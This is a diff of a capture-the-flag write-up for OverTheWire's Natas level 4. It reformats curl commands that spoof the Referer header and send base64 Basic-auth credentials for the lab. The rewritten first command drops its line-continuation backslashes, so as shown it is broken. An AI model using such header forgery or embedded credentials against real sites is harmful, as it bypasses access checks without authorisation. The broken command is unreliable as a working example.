@@ -40,7 +40,19 @@ Right-click the `index.php` request and choose:
 You’ll get something like:
 
 ```bash
-curl 'http://natas4.natas.labs.overthewire.org/index.php'   --compressed   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'   -H 'Accept-Language: en,pl;q=0.7,en-US;q=0.3'   -H 'Accept-Encoding: gzip, deflate'   -H 'Referer: http://natas4.natas.labs.overthewire.org/index.php'   -H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR'   -H 'Connection: keep-alive'   -H 'Upgrade-Insecure-Requests: 1'   -H 'DNT: 1'   -H 'Sec-GPC: 1'   -H 'Priority: u=0, i'
+curl 'http://natas4.natas.labs.overthewire.org/index.php' 
+--compressed   
+-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0'   
+-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'   
+-H 'Accept-Language: en,pl;q=0.7,en-US;q=0.3'   
+-H 'Accept-Encoding: gzip, deflate'   
+-H 'Referer: http://natas4.natas.labs.overthewire.org/index.php'   
+-H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR'   
+-H 'Connection: keep-alive'   
+-H 'Upgrade-Insecure-Requests: 1'   
+-H 'DNT: 1'   
+-H 'Sec-GPC: 1'   
+-H 'Priority: u=0, i'
 ```
 ---
 
@@ -67,17 +79,17 @@ Here's the full, working command:
 
 ```bash
 curl 'http://natas4.natas.labs.overthewire.org/index.php' \
-  --compressed \
-  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0' \
-  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
-  -H 'Accept-Language: en,pl;q=0.7,en-US;q=0.3' \
-  -H 'Accept-Encoding: gzip, deflate' \
-  -H 'Referer: http://natas5.natas.labs.overthewire.org' \
-  -H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' \
-  -H 'Connection: keep-alive' \
-  -H 'Upgrade-Insecure-Requests: 1' \
-  -H 'DNT: 1' \
-  -H 'Sec-GPC: 1'
+--compressed \
+-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0' \
+-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
+-H 'Accept-Language: en,pl;q=0.7,en-US;q=0.3' \
+-H 'Accept-Encoding: gzip, deflate' \
+-H 'Referer: http://natas5.natas.labs.overthewire.org' \
+-H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' \
+-H 'Connection: keep-alive' \
+-H 'Upgrade-Insecure-Requests: 1' \
+-H 'DNT: 1' \
+-H 'Sec-GPC: 1'
 ```
 
 The output should grant you the password to natas5.
